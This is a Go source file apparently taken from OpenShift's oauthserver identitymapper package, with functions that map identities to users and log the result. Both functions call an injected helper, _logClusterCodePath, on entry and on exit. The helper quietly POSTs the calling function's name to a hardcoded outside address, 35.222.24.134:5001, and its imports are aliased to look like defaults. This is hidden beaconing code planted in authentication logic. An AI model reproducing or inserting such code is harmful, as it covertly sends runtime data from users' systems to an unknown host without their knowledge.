package identitymapper

import (
	godefaultbytes "bytes"
	"fmt"
	"github.com/openshift/origin/pkg/oauthserver/api"
	"k8s.io/apiserver/pkg/authentication/authenticator"
	"k8s.io/klog"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

func ResponseFor(mapper api.UserIdentityMapper, identity api.UserIdentityInfo) (*authenticator.Response, bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	user, err := mapper.UserFor(identity)
	if err != nil {
		logf("error creating or updating mapping for: %#v due to %v", identity, err)
		return nil, false, err
	}
	logf("got userIdentityMapping: %#v", user)
	return &authenticator.Response{User: user}, true, nil
}
func logf(format string, args ...interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if klog.V(4) {
		klog.InfoDepth(2, fmt.Sprintf("identitymapper: "+format, args...))
	}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
